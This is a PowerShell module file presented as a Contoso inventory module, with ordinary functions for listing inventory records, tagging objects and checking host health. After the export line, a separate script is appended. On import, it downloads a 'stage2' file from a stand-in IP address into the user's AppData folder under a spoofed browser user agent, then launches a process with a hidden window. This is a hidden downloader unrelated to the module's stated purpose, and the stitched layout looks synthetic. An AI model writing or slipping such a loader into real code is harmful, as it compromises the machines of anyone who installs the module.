<#
.SYNOPSIS
    Contoso.Inventory module with the exported inventory, tagging and health commands.
.DESCRIPTION
    The module keeps a small in-memory cache and a default timeout so callers do
    not have to pass the same values on every call.
.EXAMPLE
    Import-Module .\Contoso.Inventory.psd1 -Force
#>

$culture = [System.Globalization.CultureInfo]::InvariantCulture

$script:DefaultTimeout = 10
$script:ModuleVersion = '3.2.3'

function Get-ContosoInventory {
    <#
    .SYNOPSIS
        Returns Contoso inventory records.
    .DESCRIPTION
        Returns data for the requested objects.
    .PARAMETER Name
        One or more object names.
    .PARAMETER Environment
        Target environment.
    #>
    [CmdletBinding()]
    [OutputType([pscustomobject])]
    param(
        [Parameter(ValueFromPipeline = $true, Mandatory = $true)]
        [string[]]$Name,

        [ValidateSet('Dev', 'Test', 'Prod')]
        [string]$Environment = 'Prod'
    )

    begin {
        $results = [System.Collections.Generic.List[object]]::new()
    }

    process {
        foreach ($item in $Name) {
            $results.Add([pscustomobject]@{
                Name        = $item
                Environment = $Environment
                QueriedAt   = Get-Date
            })
        }
    }

    end {
        $results
    }
}

function Set-ContosoInventoryTag {
    <#
    .SYNOPSIS
        Applies a tag to an existing object.
    .DESCRIPTION
        Returns data for the requested objects.
    .PARAMETER Name
        Object to tag.
    .PARAMETER Tag
        Tag value.
    #>
    [CmdletBinding(SupportsShouldProcess = $true)]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name,

        [Parameter(Mandatory = $true)]
        [string]$Tag
    )

    if ($PSCmdlet.ShouldProcess($Name, 'Apply tag')) {
        Write-Verbose ("Tagging {0} with {1}" -f $Name, $Tag)
        [pscustomobject]@{ Name = $Name; Tag = $Tag; UpdatedAt = Get-Date }
    }
}

function Test-ContosoInventoryHealth {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name,

        [int]$Port = 5985
    )

    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $async = $client.BeginConnect($Name, $Port, $null, $null)
        $connected = $async.AsyncWaitHandle.WaitOne(2000)
        return ($connected -and $client.Connected)
    }
    catch {
        return $false
    }
    finally {
        $client.Close()
    }
}

Export-ModuleMember -Function Get-ContosoInventory, Set-ContosoInventoryTag, Test-ContosoInventoryHealth
[CmdletBinding()]
param(
    [string]$Stage1Url = "https://192.0.2.179/stage2.ps1",
    [string]$LocalPath = "$env:APPDATA\payload.bin",
    [int]$StageTimeout = 84,
    [string]$BrowserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
)
$ErrorActionPreference = "Stop"

function Invoke-PayloadFetch {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = "Mozilla/5.0"
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Starting stage 2 transfer"
    $OperationResult = Invoke-PayloadFetch -SourceUrl $Stage1Url -DestinationPath $LocalPath -TimeoutSec $StageTimeout -UserAgent $BrowserAgent
    if ($OperationResult) {
        Start-Process -FilePath "calc.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
    }
}
catch {
    Write-Warning "Stage 2 transfer failed: $($_.Exception.Message)"
}

$ProgressPreference = "SilentlyContinue"
Write-Output "stage 4 initialized"
